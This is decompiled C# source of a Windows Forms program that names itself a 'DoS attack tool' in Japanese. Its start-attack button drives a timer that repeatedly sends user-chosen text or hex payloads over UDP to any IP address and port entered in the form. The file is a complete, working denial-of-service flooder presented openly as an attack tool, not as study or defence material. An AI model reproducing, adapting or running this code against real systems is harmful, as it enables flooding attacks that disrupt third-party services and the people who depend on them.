using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace Dos攻撃ツ\u30FCル_II
{
	// Token: 0x02000004 RID: 4
	public partial class Form1 : Form
	{
		// Token: 0x06000008 RID: 8 RVA: 0x000020FA File Offset: 0x000002FA
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002112 File Offset: 0x00000312
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002115 File Offset: 0x00000315
		private void textBox3_TextChanged(object sender, EventArgs e)
		{
			this.datatxt.ScrollBars = ScrollBars.Vertical;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002128 File Offset: 0x00000328
		private void button1_Click(object sender, EventArgs e)
		{
			this.running = this.label4.Text;
			bool flag = this.running.Contains("実行中");
			if (flag)
			{
				this.timer1.Stop();
				this.label4.Text = "停止中";
				this.button1.Text = "攻撃開始";
			}
			else
			{
				this.timer1.Start();
				this.label4.Text = "実行中";
				this.button1.Text = "攻撃停止";
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000021BD File Offset: 0x000003BD
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.Dos(this.datatype1);
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000021D0 File Offset: 0x000003D0
		public void button4_Click(object sender, EventArgs e)
		{
			this.binary = this.button4.Text;
			bool flag = this.binary.Contains("mode:16進数データを送信");
			if (flag)
			{
				this.button4.Text = "mode:文章データを送信";
				this.datatype1 = 0;
			}
			else
			{
				this.button4.Text = "mode:16進数データを送信";
				this.datatype1 = 1;
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x0000223C File Offset: 0x0000043C
		public void Dos(int datatype1)
		{
			UdpClient udpClient = new UdpClient();
			IPAddress ipaddress = IPAddress.Parse(this.iptxt.Text);
			int num = Convert.ToInt32(this.porttxt.Text);
			try
			{
				udpClient.Connect(ipaddress, num);
				bool flag = datatype1 == 0;
				if (flag)
				{
					byte[] bytes = Encoding.ASCII.GetBytes(this.datatxt.Text);
					udpClient.Send(bytes, bytes.Length);
					udpClient.AllowNatTraversal(true);
					udpClient.DontFragment = true;
				}
				else
				{
					string text = this.datatxt16.Text;
					string[] array = text.Split(new char[] { ' ' });
					byte[] array2 = new byte[array.Length];
					for (int i = 0; i < array.Length; i++)
					{
						array2[i] = Convert.ToByte(array[i], 16);
					}
					udpClient.Send(array2, array2.Length);
					udpClient.AllowNatTraversal(true);
					udpClient.DontFragment = true;
				}
			}
			catch
			{
				MessageBox.Show("");
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002358 File Offset: 0x00000558
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			string text = "https://jun-suzu.net";
			this.OpenUrl(text);
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002374 File Offset: 0x00000574
		private Process OpenUrl(string url)
		{
			return Process.Start(url);
		}

		// Token: 0x06000011 RID: 17 RVA: 0x0000238C File Offset: 0x0000058C
		private void Form1_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000012 RID: 18 RVA: 0x0000238F File Offset: 0x0000058F
		private void datatxt16_TextChanged(object sender, EventArgs e)
		{
			this.datatxt.ScrollBars = ScrollBars.Vertical;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000023A0 File Offset: 0x000005A0
		private void button2_Click(object sender, EventArgs e)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(this.datatxt.Text);
			string text = BitConverter.ToString(bytes);
			this.datatxt16.Text = text.Replace("-", " ");
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000023E8 File Offset: 0x000005E8
		private void button3_Click(object sender, EventArgs e)
		{
			string text = this.datatxt16.Text;
			string[] array = text.Split(new char[] { ' ' });
			string text2 = "";
			foreach (string text3 in array)
			{
				int num = Convert.ToInt32(text3, 16);
				string text4 = char.ConvertFromUtf32(num);
				text2 += text4;
			}
			this.datatxt.Text = text2;
		}

		// Token: 0x04000004 RID: 4
		private string running;

		// Token: 0x04000005 RID: 5
		private string binary;

		// Token: 0x04000006 RID: 6
		public int datatype1;
	}
}
